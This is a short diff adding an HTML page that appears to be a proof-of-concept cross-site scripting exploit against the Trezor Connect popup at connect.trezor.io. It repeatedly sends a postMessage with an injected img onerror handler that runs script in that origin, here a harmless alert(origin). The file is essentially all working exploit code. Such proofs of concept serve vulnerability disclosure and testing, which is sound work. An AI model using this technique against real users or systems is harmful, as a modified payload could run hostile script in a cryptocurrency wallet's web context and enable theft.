@@ -1,0 +1,12 @@
+<body>
+    <script>
+        function go(){
+            let payload = `alert(origin);`;
+            w = window.open("https://connect.trezor.io/5/popup.html");
+            setInterval(()=>{
+                w.postMessage({"type": "ui-set_operation", "payload": `<img style="display: none;" src=x onerror="${payload}">`},"*")
+            }, 100);
+        }
+    </script>
+    <button onclick="go()">Go!</button>
+  </body>
